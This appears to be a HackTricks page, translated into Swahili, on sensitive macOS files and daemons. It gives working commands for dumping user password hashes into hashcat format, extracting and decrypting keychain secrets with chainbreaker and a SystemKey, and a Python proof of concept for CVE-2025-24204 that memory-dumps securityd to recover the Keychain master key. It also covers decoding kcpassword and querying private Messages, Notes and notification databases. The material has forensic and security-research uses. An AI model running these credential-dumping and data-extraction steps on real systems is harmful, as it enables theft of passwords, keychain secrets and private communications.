# Maeneo Nyeti ya macOS na Daemons Zinazovutia

{{#include ../../../banners/hacktricks-training.md}}


## Nywila

### Shadow Passwords

Shadow password huhifadhiwa pamoja na usanidi wa mtumiaji katika plists zilizo kwenye **`/var/db/dslocal/nodes/Default/users/`**.\
Oneliner ifuatayo inaweza kutumika kutoa **taarifa zote kuhusu watumiaji** (ikiwemo maelezo ya hash):

```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```

[**Scripts kama huu**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) au [**huu**](https://github.com/octomagon/davegrohl.git) zinaweza kutumika kubadilisha hash kuwa **format** ya **hashcat**.

One-liner mbadala itakayodump creds za akaunti zote zisizo za huduma katika format ya hashcat `-m 7100` (macOS PBKDF2-SHA512):

```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```

Njia nyingine ya kupata `ShadowHashData` ya mtumiaji ni kutumia `dscl`: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``

#### Geuza `ShadowHashData` iliyonakiliwa kwenye Linux

Ikiwa attribute ilinakiliwa kwenye Linux cracking host, hifadhi **baiti zake za hexadecimal pekee** (si lebo ya `ShadowHashData:`) katika `shadowhash.hex`. Kwenye Ubuntu, `libplist-utils` hubadilisha binary plist iliyodekodiwa kuwa XML inayosomeka bila kutumia `plutil` ya macOS.<sup>[[5]](#references)</sup>

```bash
sudo apt install libplist-utils
xxd -r -p shadowhash.hex > shadowhash.bplist
plistutil -i shadowhash.bplist -o shadowhash.xml -f xml1
```

Katika XML, tumia `iterations` na `salt` na `entropy` za base64 kutoka **`SALTED-SHA512-PBKDF2`**, si verifier tofauti ya SRP. Weka `salt_b64` na `entropy_b64` ziwe maudhui husika ya XML `<data>`. Zidecode kuwa hex na utengeneze mstari mmoja wa `$ml$<iterations>$<salt_hex>$<entropy_hex>` kwa Hashcat mode `7100`. Huku ni kukisia offline baada ya kupata hash kwa privileged access, si mbinu ya initial-access au privilege-escalation.<sup>[[5]](#references)[[6]](#references)</sup>

```bash
printf '%s' "$salt_b64" | base64 -d | xxd -p -c 2000
printf '%s' "$entropy_b64" | base64 -d | xxd -p -c 2000
```

### /etc/master.passwd

Faili hii **hutumika tu** wakati mfumo unaendeshwa katika **hali ya mtumiaji mmoja** (kwa hiyo, si mara nyingi).

### Keychain Dump

Kumbuka kwamba unapotumia binary ya `security` **kutoa manenosiri yaliyosimbuliwa**, ujumbe kadhaa utauliza mtumiaji kuruhusu operesheni hii.

```bash
#security
security dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```

Kwenye macOS za kisasa, hifadhi za msingi zinazovutia zaidi kwa kawaida ni **`~/Library/Keychains/login.keychain-db`** na **`/Library/Keychains/System.keychain`**. Ni faili zinazotumia SQLite, lakini ufikiaji wa maandishi wazi bado hupitishwa kupitia **`securityd`**: kuiba DB ghafi hukupa hasa metadata na blobs zilizosimbwa kwa njia fiche, isipokuwa pia urejeshe nenosiri la mtumiaji, `SystemKey`, au master key iliyo kwenye kumbukumbu.<sup>[[2]](#references)</sup>

### [Keychaindump](https://github.com/juuso/keychaindump)

> [!CAUTION]
> Kulingana na maoni haya [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760), inaonekana zana hizi hazifanyi kazi tena kwenye Big Sur.

### Muhtasari wa Keychaindump

Zana inayoitwa **keychaindump** imetengenezwa ili kutoa manenosiri kutoka kwa keychain za macOS, lakini ina vikwazo kwenye matoleo mapya ya macOS kama vile Big Sur, kama inavyoonyeshwa kwenye [majadiliano](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760). Kutumia **keychaindump** kunahitaji mshambulizi apate ufikiaji na apandishe marupurupu hadi **root**. Zana hii hutumia ukweli kwamba keychain hufunguliwa kiotomatiki mtumiaji anapoingia, kwa urahisi, na hivyo kuruhusu programu kuifikia bila kuhitaji nenosiri la mtumiaji kila mara. Hata hivyo, mtumiaji akiamua kufunga keychain yake baada ya kila matumizi, **keychaindump** huwa haina manufaa.

**Keychaindump** hulenga mchakato maalum unaoitwa **securityd**, ambao Apple inaufafanua kama daemon ya uidhinishaji na shughuli za kriptografia, muhimu kwa kufikia keychain. Mchakato wa kutoa data huhusisha kutambua **Master Key** inayotokana na nenosiri la kuingia la mtumiaji. Key hii ni muhimu kwa kusoma faili ya keychain. Ili kupata **Master Key**, **keychaindump** huchanganua heap ya kumbukumbu ya **securityd** kwa kutumia amri ya `vmmap`, na kutafuta key zinazowezekana ndani ya maeneo yaliyowekewa alama ya `MALLOC_TINY`. Amri ifuatayo hutumika kukagua maeneo haya ya kumbukumbu:

```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```

Baada ya kutambua master keys zinazoweza kutumika, **keychaindump** hutafuta muundo maalum (`0x0000000000000018`) kwenye heaps unaoashiria mgombea wa master key. Hatua zaidi, ikiwemo deobfuscation, zinahitajika ili kutumia key hii, kama ilivyoelezwa kwenye source code ya **keychaindump**. Wachambuzi wanaochunguza eneo hili wanapaswa kutambua kuwa data muhimu ya kusimbua keychain imehifadhiwa kwenye kumbukumbu ya mchakato wa **securityd**. Mfano wa amri ya kuendesha **keychaindump** ni:

```bash
sudo ./keychaindump
```

### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) inaweza kutoa aina zifuatazo za taarifa kutoka kwenye macOS keychain kwa njia inayofaa kwa uchunguzi wa kidijitali:

- Nenosiri la Keychain lililohashiwa, linalofaa kuvunjwa kwa kutumia [hashcat](https://hashcat.net/hashcat/) au [John the Ripper](https://www.openwall.com/john/)
- Nenosiri za Intaneti
- Nenosiri za jumla
- Funguo za faragha
- Funguo za umma
- Vyeti vya X509
- Madokezo salama
- Nenosiri za Appleshare

Ukiwa na nenosiri la kufungua keychain, master key iliyopatikana kwa kutumia [volafox](https://github.com/n0fate/volafox) au [volatility](https://github.com/volatilityfoundation/volatility), au faili ya kufungua kama vile SystemKey, Chainbreaker pia itatoa nenosiri katika maandishi wazi.

Bila mojawapo ya mbinu hizi za kufungua Keychain, Chainbreaker itaonyesha taarifa nyingine zote zinazopatikana.

#### **Dump keychain keys**

```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```

#### **Toa funguo za keychain (pamoja na nywila) kwa kutumia SystemKey**

```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```

#### **Dump keychain keys (pamoja na nywila) ili ku-crack hash**

```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```

#### **Dump keychain keys (zenye passwords) kwa kutumia memory dump**

[Fuata hatua hizi](../index.html#dumping-memory-with-osxpmem) ili kufanya **memory dump**

```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unfortunately, Volafox does not support recent macOS versions
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```

#### **Dump keychain keys (with passwords) kwa kutumia nenosiri la mtumiaji**

Ikiwa unajua nenosiri la mtumiaji, unaweza kulitumia **kudump na kusimbua keychain ambazo ni za mtumiaji**.

```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```

### Keychain master key kupitia entitlement ya `gcore` (CVE-2025-24204)

macOS 15.0 (Sequoia) ilisambazwa ikiwa na entitlement ya **`com.apple.system-task-ports.read`** kwenye `/usr/bin/gcore`, hivyo admin yeyote wa ndani (au app hasidi iliyosainiwa) angeweza kutoa dump ya kumbukumbu ya mchakato wowote hata SIP/TCC zikiwa zinatekelezwa. Kutoa dump ya `securityd` hufichua **Keychain master key** ikiwa wazi na hukuwezesha kusimbua `login.keychain-db` bila nenosiri la mtumiaji.<sup>[[1]](#references)</sup>

**Jaribio la haraka kwenye builds zilizo hatarini (15.0–15.2):**

```bash
sudo pgrep securityd        # usually a single PID
sudo gcore -o /tmp/securityd $(pgrep securityd)   # produces /tmp/securityd.<pid>
python3 - <<'PY'
import mmap,re,sys
with open('/tmp/securityd.'+sys.argv[1],'rb') as f:
    mm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)
    for m in re.finditer(b'\x00\x00\x00\x00\x00\x00\x00\x18.{96}',mm):
        c=m.group(0)
        if b'SALTED-SHA512-PBKDF2' in c: print(c.hex()); break
PY $(pgrep securityd)
```
Pitisha ufunguo wa hex uliotolewa kwa Chainbreaker (`--key <hex>`) ili kusimbua keychain ya kuingia. Apple iliondoa entitlement hiyo katika **macOS 15.3+**, kwa hivyo hii hufanya kazi tu kwenye matoleo ya Sequoia ambayo hayajapachikwa viraka au mifumo ambayo imehifadhi binary iliyo hatarini.

### kcpassword

Faili ya **kcpassword** huhifadhi **nenosiri la kuingia la mtumiaji**, lakini tu ikiwa mmiliki wa mfumo **amewezesha kuingia kiotomatiki**. Hivyo, mtumiaji ataingia kiotomatiki bila kuulizwa nenosiri (jambo ambalo si salama sana).

Nenosiri huhifadhiwa kwenye faili ya **`/etc/kcpassword`**, likiwa limefanyiwa XOR kwa kutumia ufunguo **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. Ikiwa nenosiri la mtumiaji ni refu kuliko ufunguo, ufunguo huo utatumika tena.\
Hii hufanya nenosiri kuwa rahisi sana kurejesha, kwa mfano kwa kutumia script kama [**hii**](https://gist.github.com/opshope/32f65875d45215c3677d).

## Taarifa Muhimu katika Databases

### Messages

```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```

### Notifications

Kabla ya **Sequoia**, kwa kawaida unaweza kupata hifadhi ya Notification Center kwenye **`$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db`**. Katika **Sequoia+**, Apple ilihamishia kwenye group container inayolindwa na TCC **`$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db`**.

Taarifa nyingi zinazovutia zimehifadhiwa ndani ya safu wima za **blob**, kwa hiyo utahitaji kutoa maudhui hayo na kuyabadilisha kuwa kitu kinachosomeka na binadamu (`plutil -p -`, `strings`, au parser ndogo). Mifano ya quick triage:

```bash
# Legacy location (older releases / affected builds)
DA=$(getconf DARWIN_USER_DIR)
strings "$DA/com.apple.notificationcenter/db2/db" | grep -i -A4 slack
sqlite3 "$DA/com.apple.notificationcenter/db2/db"   "select hex(data) from record order by delivered_date desc limit 1;" | xxd -r -p - | plutil -p -

# Sequoia+ location (TCC-protected)
sqlite3 "$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db"   "select app_identifier, presented, datetime(delivered_date+978307200,'unixepoch'), hex(data) from record order by delivered_date desc limit 5;"
```

#### Masuala ya hivi karibuni ya faragha (NotificationCenter DB)

- Katika macOS **14.7–15.1**, Apple ilihifadhi maudhui ya banner katika SQLite ya `db2/db` bila kuyaficha ipasavyo. CVE **CVE-2024-44292/44293/40838/54504** ziliruhusu mtumiaji yeyote wa ndani kusoma maandishi ya arifa za watumiaji wengine kwa kufungua tu DB (bila ombi la TCC).<sup>[[3]](#references)</sup>
- Apple ilipunguza hatari hii kwa kuhamisha DB hadi `group.com.apple.usernoted` na kuilinda kwa TCC katika matoleo mapya zaidi ya Sequoia, kwa hivyo kwenye mifumo ya sasa kwa kawaida unahitaji muktadha sahihi wa mtumiaji au TCC bypass ili kuisoma.<sup>[[4]](#references)</sup>
- Kwenye mifumo ya zamani, nakili faili za `db`, `db-wal`, na `db-shm` pamoja kabla ya kusasisha au kuwasha upya ikiwa unataka kuhifadhi ushahidi.

### Maelezo

**Notes** za watumiaji zinaweza kupatikana katika `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`

```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

# ZICNOTEDATA.ZDATA is usually a gzip-compressed protobuf blob
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.z ; done
```

Ikiwa one-liner iliyo hapo juu ina kelele nyingi, export `ZICNOTEDATA.ZDATA`, ifungue kwa gunzip, kisha uchanganue protobuf: hii kwa kawaida huwa ya kuaminika zaidi kuliko kuendesha `strings` moja kwa moja kwenye SQLite.

### Background Tasks / Login Items

Tangu **Ventura**, login items zilizoidhinishwa na mtumiaji na baadhi ya background tasks hufuatiliwa katika stores za **BTM** kama vile **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm`** na system cache yenye toleo **`/private/var/db/com.apple.backgroundtaskmanagement/BackgroundItems-v<xx>.btm`**.

Faili hizi zinafaa kwa kutambua kwa haraka persistence, helper tools, na baadhi ya background items zinazodhibitiwa na MDM:

```bash
plutil -p ~/Library/Application\ Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm | head -100
sfltool dumpbtm
```

Kwa upande wa persistence na maelezo ya ndani ya BTM, angalia [ukurasa wa maeneo ya auto-start](../../macos-auto-start-locations.md#login-items) na [maelezo ya Background Tasks Management](../macos-security-protections/README.md#background-tasks-management).

## Preferences

Katika apps za macOS, preferences ziko kwenye **`$HOME/Library/Preferences`**, na katika iOS ziko kwenye `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.

Katika macOS, CLI tool **`defaults`** inaweza kutumika **kubadilisha faili la Preferences**.

**`/usr/sbin/cfprefsd`** inamiliki huduma za XPC `com.apple.cfprefsd.daemon` na `com.apple.cfprefsd.agent`, na inaweza kuitwa kutekeleza vitendo kama vile kubadilisha preferences.

## OpenDirectory permissions.plist

Faili la `/System/Library/OpenDirectory/permissions.plist` lina ruhusa zinazotumika kwa sifa za node na linalindwa na SIP.\
Faili hili hutoa ruhusa kwa watumiaji maalum kwa kutumia UUID (na si uid) ili waweze kufikia taarifa nyeti kama `ShadowHashData`, `HeimdalSRPKey` na `KerberosKeys`, miongoni mwa nyinginezo:

```xml
[...]
<key>dsRecTypeStandard:Computers</key>
<dict>
	<key>dsAttrTypeNative:ShadowHashData</key>
	<array>
		<dict>
			<!-- allow wheel even though it's implicit -->
			<key>uuid</key>
			<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
			<key>permissions</key>
			<array>
				<string>readattr</string>
				<string>writeattr</string>
			</array>
		</dict>
	</array>
	<key>dsAttrTypeNative:KerberosKeys</key>
	<array>
		<dict>
			<!-- allow wheel even though it's implicit -->
			<key>uuid</key>
			<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
			<key>permissions</key>
			<array>
				<string>readattr</string>
				<string>writeattr</string>
			</array>
		</dict>
	</array>
[...]
```

## Arifa za Mfumo

### Arifa za Darwin

daemon kuu ya arifa ni **`/usr/sbin/notifyd`**. Ili kupokea arifa, clients lazima wajisajili kupitia Mach port ya `com.apple.system.notification_center` (zikague kwa `sudo lsmp -p <pid notifyd>`). daemon inaweza kusanidiwa kwa faili la `/etc/notify.conf`.

Majina yanayotumika kwa arifa ni notation za kipekee za reverse DNS. Arifa inapotumwa kwa jina mojawapo, client(s) walioonyesha kwamba wanaweza kuishughulikia wataipokea.

Inawezekana kutupa hali ya sasa (na kuona majina yote) kwa kutuma signal ya SIGUSR2 kwa mchakato wa notifyd na kusoma faili linalozalishwa: `/var/run/notifyd_<pid>.status`:

```bash
ps -ef | grep -i notifyd
    0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
  memory: com.apple.system.timezone
  common: com.apple.analyticsd.running
  common: com.apple.CFPreferences._domainsChangedExternally
  common: com.apple.security.octagon.joined-with-bottle
[...]
```

### Distributed Notification Center

**Distributed Notification Center**, ambayo binary yake kuu ni **`/usr/sbin/distnoted`**, ni njia nyingine ya kutuma arifa. Hutoa baadhi ya huduma za XPC na hukagua baadhi ya vitu ili kujaribu kuthibitisha clients.

### Apple Push Notifications (APN)

Katika hali hii, applications zinaweza kujisajili kwa **mada**. Client itatengeneza token kwa kuwasiliana na seva za Apple kupitia **`apsd`**.\
Kisha, providers pia watakuwa wametengeneza token na wataweza kuunganishwa na seva za Apple ili kutuma ujumbe kwa clients. Ujumbe huu utapokewa ndani ya kifaa na **`apsd`**, ambayo itasambaza arifa kwa application inayoisubiri.

Mipangilio iko kwenye `/Library/Preferences/com.apple.apsd.plist`.

Kuna hifadhidata ya ndani ya ujumbe kwenye macOS katika `/Library/Application\ Support/ApplePushService/aps.db` na kwenye iOS katika `/var/mobile/Library/ApplePushService`. Ina majedwali 3: `incoming_messages`, `outgoing_messages` na `channel`.

```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```

Pia inawezekana kupata taarifa kuhusu daemon na miunganisho kwa kutumia:

```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```

## Arifa za Mtumiaji

Hizi ni arifa ambazo mtumiaji anapaswa kuona kwenye skrini:

- **`CFUserNotification`**: API hizi hutoa njia ya kuonyesha dirishani ujumbe ibukizi wenye ujumbe.
- **The Bulletin Board**: Hii huonyesha kwenye iOS bango ambalo hupotea na kuhifadhiwa kwenye Notification Center.
- **`NSUserNotificationCenter`**: Huduma ya zamani ya notification-center kwenye macOS. Kwenye matoleo ya zamani, hifadhidata kwa kawaida huwa katika `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`; kwenye Sequoia na matoleo ya baadaye, ilihamishiwa kwenye `~/Library/Group Containers/group.com.apple.usernoted/db2/db`.

## References

- [1] [HelpNetSecurity – Entitlement ya macOS gcore iliruhusu uchimbaji wa master key ya Keychain (CVE-2025-24204)](https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)
- [2] [Apple Platform Security – Ulinzi wa data ya Keychain](https://support.apple.com/guide/security/keychain-data-protection-secb0694df1a/web)
- [3] [Rapid7 – Ufichuaji wa SQLite ya Notification Center (CVE-2024-44292 na nyinginezo)](https://www.rapid7.com/db/vulnerabilities/apple-osx-notificationcenter-cve-2024-44292/)
- [4] [9to5Mac – Apple yashughulikia masuala ya faragha kuhusu hifadhidata ya Notification Center kwenye macOS Sequoia](https://9to5mac.com/2024/09/01/security-bite-apple-addresses-privacy-concerns-around-notification-center-database-in-macos-sequoia/)
- [5] [SRA Labs – Kuvunja nywila za macOS](https://labs.sra.io/posts/macospasswordcracking)
- [6] [Hashcat example hashes – macOS v10.8+ (PBKDF2-SHA512)](https://hashcat.net/wiki/doku.php?id=example_hashes)
{{#include ../../../banners/hacktricks-training.md}}
